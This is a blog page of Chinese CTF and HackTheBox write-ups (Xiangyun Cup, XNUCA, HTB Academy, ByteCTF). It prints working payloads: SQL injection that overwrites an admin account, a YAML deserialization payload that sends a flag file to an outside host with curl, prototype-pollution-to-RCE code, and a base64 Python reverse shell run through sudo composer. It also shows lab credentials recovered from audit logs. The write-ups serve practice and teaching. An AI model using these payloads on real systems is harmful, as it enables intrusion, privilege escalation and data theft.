    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
    burp0_data = {&quot;id[={exp} ;-- ]&quot;.format(exp=exp): &quot;1&quot;}
    return requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

@app.route(&#39;/&#39;)
def hello_world():
    payload = request.args.get(&quot;exp&quot;,&quot;&quot;)
    r=access(payload)
    print(payload)
    return r.text


app.run()</code></pre>
<p>直接访问:</p>
<p><code>http://127.0.0.1:5000/?exp=1;replace INTO zzz_user(uid,u_gid, u_lid, u_onoff, u_order, sex, username, password, question, answer, regtime, truename, face, province, city, district, address, post, tel, mobile, email, qq, u_desc, adminrand, lastlogintime, lastloginip, logincount, sysinfo, points, balance) VALUES (1, 1, 1, 1, 0, &#39;%E7%94%B7&#39;, &#39;admin&#39;, &#39;1ccbbb718e0e9c3a&#39;, &#39;8TBRJ2H5NXW57EVF&#39;, &#39;S8DDQC9YV494G84Q&#39;, &#39;&#39;, &#39;%E5%88%9B%E5%A7%8B%E4%BA%BA&#39;, &#39;face01.png&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;6a79122eab1e8abd10bcabd91ebbc36c&#39;, &#39;2020/11/22 17:25:13&#39;, &#39;127.0.0.1&#39;, 6, &#39;&#39;, 0, 0);--</code></p>
<p>修改admin密码为041676</p>
<p>没有写权限，但是我们只要读到flag就好了，利用这个cms的模板渲染机制，修改模板为我们想读的文件/flag，来拿到flag</p>
<h2 id="profile-system"><a href="#profile-system" class="headerlink" title="profile system"></a>profile system</h2><p>一看就是一个flask(它的cookie)，文件上传可以目录穿越，猜测后端访问uploads路由是这样的：<code>/uploads/&lt;path:path&gt;</code><br>直接读取<code>/uploads/../app.py</code></p>
<p>app.py</p>
<pre><code class="python">from flask import Flask, render_template, request, flash, redirect, send_file,session,render_template_string
import os
import re
from hashlib import md5
import yaml


app = Flask(__name__)
app.config[&#39;UPLOAD_FOLDER&#39;] = os.path.join(os.curdir, &quot;uploads&quot;)
app.config[&#39;SECRET_KEY&#39;] = &#39;Th1s_is_A_Sup333er_s1cret_k1yyyyy&#39;
ALLOWED_EXTENSIONS = {&#39;yaml&#39;,&#39;yml&#39;}

def allowed_file(filename):
    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower()

@app.route(&quot;/&quot;)
def index():
    session[&#39;priviledge&#39;] = &#39;guest&#39;
    return &quot;home&quot;

@app.route(&quot;/upload&quot;, methods=[&quot;POST&quot;])
def upload():
    file = request.files[&quot;file&quot;]
    if file.filename == &#39;&#39;:
        flash(&#39;No selected file&#39;)
        return redirect(&quot;/&quot;)
    elif not (allowed_file(file.filename) in ALLOWED_EXTENSIONS):
        flash(&#39;Please upload yaml/yml only.&#39;)
        return redirect(&quot;/&quot;)
    else:
        dirname = md5(request.remote_addr.encode()).hexdigest()
        filename = file.filename
        session[&#39;filename&#39;] = filename 
        upload_directory = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname)
        if not os.path.exists(upload_directory):
            os.mkdir(upload_directory)
        upload_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname, filename)
        file.save(upload_path)
        return os.path.join(dirname, filename)


@app.route(&quot;/uploads/&lt;path:path&gt;&quot;)
def uploads(path):
    return send_file(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], path))


@app.route(&quot;/view&quot;)
def view():
    dirname = md5(request.remote_addr.encode()).hexdigest()
    realpath = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname,session[&#39;filename&#39;]).replace(&#39;..&#39;,&#39;&#39;)
    if session[&#39;priviledge&#39;] ==&#39;elite&#39; and os.path.isfile(realpath):
        try:
            with open(realpath,&#39;rb&#39;) as f:
                data = f.read()
                if not re.fullmatch(b&quot;^[ -\-/-\]a-}\n\r]*$&quot;,data, flags=re.MULTILINE):
                    info = {&#39;user&#39;: &#39;elite-user&#39;}
                    flash(&#39;Sth weird...&#39;)
                else:
                    info = yaml.load(data)
                if info[&#39;user&#39;] == &#39;Administrator&#39;:
                    flash(&#39;Welcome admin!&#39;)
                else:
                    raise ()
        except :
            info = {&#39;user&#39;: &#39;elite-user&#39;}
    else:
        info = {&#39;user&#39;: &#39;guest&#39;}
    return render_template_string(&quot;{{user}}&quot;,user=info[&#39;user&#39;])
#.,^,_,`,~


if __name__ == &quot;__main__&quot;:
    app.run(&#39;0.0.0.0&#39;,port=8888,threaded=True)
</code></pre>
<p>有了secret我们就可以任意伪造session了</p>
<p>注意到：<code>info = yaml.load(data)</code></p>
<p>直接使用这个会有个提醒</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201122221248.png" alt="image16652"></p>
<p>百度一下为啥不安全，yaml反序列化注入get</p>
<p>直接抄来一个exp</p>
<pre><code class="yaml">!!python/object/new:type
  args: [&quot;z&quot;, !!python/tuple [], {&quot;extend&quot;: !!python/name:exec }]
  listitems: &quot;\x5f\x5fimport\x5f\x5f(&#39;os&#39;)\x2esystem(&#39;curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt&#39;)&quot;</code></pre>
<p>看下进入<code>info = yaml.load(data)</code> 的前提</p>
<p><code>re.fullmatch(b&quot;^[ -\-/-\]a-}\n\r]*$&quot;,data, flags=re.MULTILINE)</code></p>
<p>利用<a href="https://regex101.com/" target="_blank" rel="noopener">regex101</a>读懂这个的意思，其实就是禁止出现</p>
<pre><code>.^_`~</code></pre><p>这几个字符</p>
<p>这个payload完美符合所有条件</p>
<p>一定要注意payload不能出现\r</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>python的float类型有两个特殊的值：nan(not a number),inf(infinity,无穷)</p>
<p><strong>php parse_url 小trick</strong></p>
<p><code>var_dump(parse_url(&quot;http:/ctf.ccreater.top:5000/&quot;))</code></p>
<pre><code>array(2) {
  &#39;scheme&#39; =&gt;
  string(4) &quot;http&quot;
  &#39;path&#39; =&gt;
  string(23) &quot;/ctf.ccreater.top:5000/&quot;
}</code></pre><p><code>http://foo@127.0.0.1:6379%20@www.baidu.com/</code>:<a href="https://bugs.php.net/bug.php?id=77991" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=77991</a></p>
<pre><code>var_dump(parse_url(&quot;http://foo@127.0.0.1:6379%20@www.baidu.com&quot;));
php shell code:1:
array(4) {
  &#39;scheme&#39; =&gt;
  string(4) &quot;http&quot;
  &#39;host&#39; =&gt;
  string(13) &quot;www.baidu.com&quot;
  &#39;user&#39; =&gt;
  string(13) &quot;foo@127.0.0.1&quot;
  &#39;pass&#39; =&gt;
  string(7) &quot;6379%20&quot;
}</code></pre><p>python 中的yaml.load也存在反序列化问题</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/11/24/2020祥云杯web题解/">https://www.ccreater.top/2020/11/24/2020祥云杯web题解/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/" data-id="ckmn5dccx000hjsni0ti37etv" data-title="2020祥云杯web题解" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-XNUCA_2020_oooooooldjs题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2020-11-13T11:55:55.628Z" itemprop="datePublished">2020-11-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="XNUCA-2020-oooooooldjs题解-md"><a href="#XNUCA-2020-oooooooldjs题解-md" class="headerlink" title="XNUCA_2020_oooooooldjs题解.md"></a>XNUCA_2020_oooooooldjs题解.md</h1><p>文章首发于<a href="https://www.anquanke.com/post/id/221388" target="_blank" rel="noopener">安全客</a></p>
<p>题目描述</p>
<blockquote>
<p><code>npm audit</code> may miss something, be careful of the version of <code>lodash</code>. There is prototype pollution in <code>express-validator</code>, limited but powerful。</p>
</blockquote>
<p>npm audit发现lodash有原型链污染漏洞</p>
<pre><code># Run  npm update lodash --depth 2  to resolve 1 vulnerability

  Low             Prototype Pollution                         

  Package         lodash                                      

  Dependency of   express-validator                           

  Path            express-validator &gt; lodash                  

  More info       https://npmjs.com/advisories/1523      </code></pre><p>在<a href="https://snyk.io/test/npm/express-validator/2.21.0中查看lodash中出现原型链污染的地方，依次下断点" target="_blank" rel="noopener">https://snyk.io/test/npm/express-validator/2.21.0中查看lodash中出现原型链污染的地方，依次下断点</a></p>
<p>传入json数据:<code>{&quot;233&quot;:123}</code>发现：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031215650.png" alt="image1151"></p>
<p>调用了存在原型链污染的set方法，且[233]不为object的键值，在这里可以触发原型链污染</p>
<p>一波测试后得到原型链污染的payload:<code>{&quot;.\&quot;].__proto__[\&quot;crossDomain&quot;:{&quot;1&quot;:&quot;2&quot;}}</code>，但是不能控制原型链污染的值</p>
<p>审计题目代码发现，非常有意思的两个地方</p>
<ol>
<li><p>显眼的dangerous<br><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220029.png" alt="image1432"></p>
</li>
<li><p>这里自己实现了数据库的CURD四种方法</p>
</li>
</ol>
<p>学习了一波后发现第一点可以触发RCE</p>
<pre><code class="javascript">const { JSDOM } = require(&quot;jsdom&quot;);

new JSDOM(`
&lt;body&gt;
  &lt;script&gt;
    const outerRealmFunctionConstructor = Node.constructor;
    const process = new outerRealmFunctionConstructor(&quot;return process&quot;)();
    const require = process.mainModule.require;

    // Game over!
    const fs = require(&#39;fs&#39;);
    console.log(fs.readdirSync(&#39;.&#39;));
  &lt;/script&gt;
&lt;/body&gt;
`, { 
  runScripts: &quot;dangerously&quot; 
});</code></pre>
<p>在util.js中定义了唯一会用到jsdom的函数</p>
<pre><code class="javascript">const {
    JSDOM
} = require(&quot;jsdom&quot;)
const {
    window
} = new JSDOM(``, {
    url: originUrl,
    runScripts: &quot;dangerously&quot;
})
// server side `$` XD
const $ = require(&#39;jquery&#39;)(window)

const requests = async (url, method) =&gt; {
    let result = &quot;&quot;
    try {
        result = await $.ajax({
            url: url,
            type: method,
        })

        console.log(result)
    } catch (err) {
        console.log(err)
        result = {
            data: &quot;&quot;
        }
    }

    return result.data
}</code></pre>
<p>jquery的ajax有个特性是如果返回的content-type是text/javascript等代表着js脚本，那么便会执行js，结合上面的jsdom从而RCE，但是在低版本的话确实可以这么做，但是在高版本jquery进行了限制，如果是跨域请求便不会执行脚本</p>
<p>调试jquery代码发现：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220811.jpg" alt="image2617"></p>
<p>这里会覆盖我们的content-type，继续调试发现设置crossDomain的逻辑</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220938.png" alt="image2751"></p>
<p>如果s.crossDomain == null就会进入是否跨域的判断</p>
<p>利用前面的原型链污染从而绕过jquery的跨域限制</p>
<p>还剩下一个问题，我们如何传入自己的url</p>
<p>express开着一个中间件限制了我们url,而且也不让更新url类型的数据</p>
<pre><code class="javascript">const middlewares = [
    // should be
    body(&#39;*&#39;).trim(),
    body(&#39;type&#39;).if(body(&#39;type&#39;).exists()).bail().isIn([&#39;url&#39;, &#39;text&#39;])
    .withMessage(&quot;type must be `url` or `text`&quot;),
    body(&#39;block&#39;).if(body(&#39;type&#39;).exists()).notEmpty()
    .withMessage(&quot;no `block` content&quot;).bail()
    .if(body(&#39;type&#39;).isIn([&#39;url&#39;])).isURL({
        require_tld: false
    })
    .custom((value, {
        req
    }) =&gt; new URL(value).host === host)
    .withMessage(&quot;invalid url!&quot;),
    (req, res, next) =&gt; {
        const errors = validationResult(req)
        if (!errors.isEmpty()) {
            return res.status(400).json({
                errors: errors.array()
            })
        }
        next()
    }
]</code></pre>
<p>回到我们刚刚说的第二点有趣的地方，这个简单的数据库并不支持事务功能，也就是说删除type和data并不会同时删除是存在一定的时间差的，相关代码如下</p>
<pre><code class="javascript">D(id) {
        let di, dt
        for (const index in this.datas) {
            if (this.datas[index].id === id) {
                dt = this.types[index]
                this.types.splice(index, 1)
                di = index
            }
        }
        if (dt === &#39;url&#39;) {
            requests(this.datas[di].block, &quot;DELETE&quot;).finally(()=&gt;{
                this.datas = this.datas.filter((value)=&gt;value.id !== id)
            })
        } else {
            this.datas = this.datas.filter((value)=&gt;value.id !== id)
        }
    }</code></pre>
<p>在删除了type后，他进行了一个相当耗时的操作：访问url，之后才删除data，又因为这里是一个链式删除，一个接着一个删除，所有type删除完后它可能才删除一个data</p>
<p>于是有：</p>
<pre><code class="python">import requests
challenge = &quot;http://eci-2ze1whgyeh7v30y5j8yh.cloudeci1.ichunqiu.com:8888&quot;
def insertUrl(url):
    burp0_url = challenge+&quot;/data&quot;
    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
    burp0_data = {&quot;type&quot;: &quot;url&quot;, &quot;block&quot;: url}
    result = {}
    while True:
        try:
            result = requests.post(burp0_url, headers=burp0_headers, data=burp0_data).json()
        except Exception as e:
            continue
        return result

def insertData(data):
    burp0_url = challenge+&quot;/data&quot;
    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
    burp0_data = {&quot;type&quot;: &quot;text&quot;, &quot;block&quot;: data}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return r.json()

def setLongLine(length=2000):
    endId=&quot;&quot;
    url = &quot;http://localhost:8888/data/fake-uuid&quot;
    count = 0
    while count &lt; length:
        count+=1
        data = insertUrl(url)
        url = &quot;http://localhost:8888/data/&quot;+data[&quot;data&quot;][&quot;id&quot;]
        endId = data[&quot;data&quot;][&quot;id&quot;]</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/11/13/XNUCA_2020_oooooooldjs题解/">https://www.ccreater.top/2020/11/13/XNUCA_2020_oooooooldjs题解/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/" data-id="ckmn5dcdt002qjsni9dpx6ddx" data-title="XNUCA_2020_oooooooldjs题解" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-Academy_write_up" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/12/Academy_write_up/" class="article-date">
  <time class="dt-published" datetime="2020-11-12T14:57:52.133Z" itemprop="datePublished">2020-11-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/12/Academy_write_up/">Academy_write_up</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Academy-Write-Up"><a href="#Academy-Write-Up" class="headerlink" title="Academy Write Up"></a>Academy Write Up</h1><p>目标：10.10.10.215</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  socks5?
</code></pre><p>33060端口不知道是啥</p>
<h2 id="攻击http服务"><a href="#攻击http服务" class="headerlink" title="攻击http服务"></a>攻击http服务</h2><p>扫描目录得到</p>
<pre><code>[20:35:08] 200 -    3KB - /admin.php
[20:36:10] 200 -    0B  - /config.php
[20:37:09] 302 -   54KB - /home.php  -&gt;  login.php
[20:37:21] 200 -    2KB - /index.php
[20:37:40] 200 -    3KB - /login.php
[20:38:32] 200 -    3KB - /register.php</code></pre><p>测试登入，注册接口的时候发现，</p>
<p>注册的POST请求是这样的：<code>uid=admin123&amp;password=admin123&amp;confirm=admin123&amp;roleid=0</code></p>
<p>有个roleid参数，将其改成1，注册admin账号</p>
<p>admin登入成功后，发现子域名</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112224004.png" alt="image811"></p>
<p>一进去网站就是报错状态，试着爆破路径，啥也没有</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201111213605.png" alt="image951"></p>
<p>msf搜索了一下laravel</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112224208.png" alt="image1077"></p>
<p>设置好参数试了一下就打通了</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="www-data用户提升至cry0l1t3"><a href="#www-data用户提升至cry0l1t3" class="headerlink" title="www-data用户提升至cry0l1t3"></a>www-data用户提升至cry0l1t3</h3><p>翻了翻配置文件找到/var/www/html/academy/.env</p>
<pre><code>
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
</code></pre><p>这个密码诶个是过去发现是cry0l1t3的密码</p>
<h3 id="cry0l1t3移动到mrb3n"><a href="#cry0l1t3移动到mrb3n" class="headerlink" title="cry0l1t3移动到mrb3n"></a>cry0l1t3移动到mrb3n</h3><pre><code>id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)</code></pre><p>发现和syslog在同一个组下，我们可以查看任意日志了</p>
<p><code>cd /var/log/audit&amp;&amp;cat * | grep data=</code> 查看用户的输入</p>
<pre><code>type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=7375206D7262336E0A
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;su&quot; data=6D7262336E5F41634064336D79210A
type=TTY msg=audit(1597199304.778:89): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=77686F616D690A
type=TTY msg=audit(1597199308.262:90): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=657869740A
type=TTY msg=audit(1597199317.622:93): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=2F62696E2F62617368202D690A
type=TTY msg=audit(1597199443.421:94): tty pid=2606 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;nano&quot; data=1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
type=TTY msg=audit(1597199533.458:95): tty pid=2643 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;nano&quot; data=1B5B421B5B411B5B411B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B427F1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
type=TTY msg=audit(1597199575.087:96): tty pid=2686 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;nano&quot; data=3618790D
type=TTY msg=audit(1597199606.563:97): tty pid=2537 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;bash&quot; data=63611B5B411B5B411B5B417F7F636174206175097C206772657020646174613D0D636174206175097C20637574202D663131202D642220220D1B5B411B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B431B5B436772657020646174613D207C200D1B5B41203E202F746D702F646174612E7478740D69640D6364202F746D700D6C730D6E616E6F2064090D636174206409207C207878092D72202D700D6D617F7F7F6E616E6F2064090D6361742064617409207C20787864202D7220700D1B5B411B5B442D0D636174202F7661722F6C6F672F61750974097F7F7F7F7F7F6409617564097C206772657020646174613D0D1B5B411B5B411B5B411B5B411B5B411B5B420D1B5B411B5B411B5B410D1B5B411B5B411B5B410D657869747F7F7F7F686973746F72790D657869740D
type=TTY msg=audit(1597199606.567:98): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=657869740A
type=TTY msg=audit(1597199610.163:107): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=2F62696E2F62617368202D690A
type=TTY msg=audit(1597199616.307:108): tty pid=2712 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;bash&quot; data=6973746F72790D686973746F72790D657869740D
type=TTY msg=audit(1597199616.307:109): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=657869740A
</code></pre><p>其中的<code>7375206D7262336E0A</code>=<code>su mrb3n</code>,<code>6D7262336E5F41634064336D79210A</code>=<code>mrb3n_Ac@d3my!</code></p>
<p>拿到mrb3n的密码</p>
<h3 id="mrb3n提权root"><a href="#mrb3n提权root" class="headerlink" title="mrb3n提权root"></a>mrb3n提权root</h3><p>sudo -l 看看自己能不能用sudo</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112225248.png" alt="image4850"></p>
<p>发现我们可以用sudo 执行composer</p>
<p>直接RCE</p>
<p>新建composer.json</p>
<pre><code>{
    &quot;scripts&quot;: {
        &quot;test&quot;: &quot;python3 -c \&quot;import base64; exec(base64.b64decode(&#39;aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE0Ljk5Jyw1NTU1KSkKd2hpbGUgMTogIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMucmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQucmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk=&#39;))\&quot;&quot;
    }
}</code></pre><p><code>sudo composer run-script --timeout=0 test</code></p>
<p>拿到root权限</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201112225515.png" alt="image5511"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>一定要记得看自己能不能sudo</li>
<li>在adm组中通常可以查看任意日志</li>
<li>/var/log/audit存放着用户的输入，很有可能拿到密码</li>
</ol>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/11/12/Academy_write_up/">https://www.ccreater.top/2020/11/12/Academy_write_up/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2020/11/12/Academy_write_up/" data-id="ckmn5dcd5000xjsnia3x55rkh" data-title="Academy_write_up" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020ByteCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/10/26/2020ByteCTF/" class="article-date">
  <time class="dt-published" datetime="2020-10-26T13:28:23.439Z" itemprop="datePublished">2020-10-26</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/10/26/2020ByteCTF/">2020ByteCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ByteCTF2020"><a href="#ByteCTF2020" class="headerlink" title="ByteCTF2020"></a>ByteCTF2020</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-scrapy"><a href="#easy-scrapy" class="headerlink" title="easy_scrapy"></a>easy_scrapy</h3><p>体验一编网站的功能后，发现如下api</p>
<pre><code>/list
/push post:url=https%3A%2F%2Fwww.4399.com&amp;code=16674458
/result?url=https://www.4399.com</code></pre><p>让网站爬取自己的服务器以获得请求头</p>
<pre><code>GET / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en
User-Agent: scrapy_redis
Accept-Encoding: gzip, deflate
Host: ccreater.top:60000

</code></pre><p>通过ua头发现是：scrapy_redis</p>
<p>本地搭建scrapy_redis服务爬取网站，查看redis里设置的键值，发现myscrapy:requests中</p>
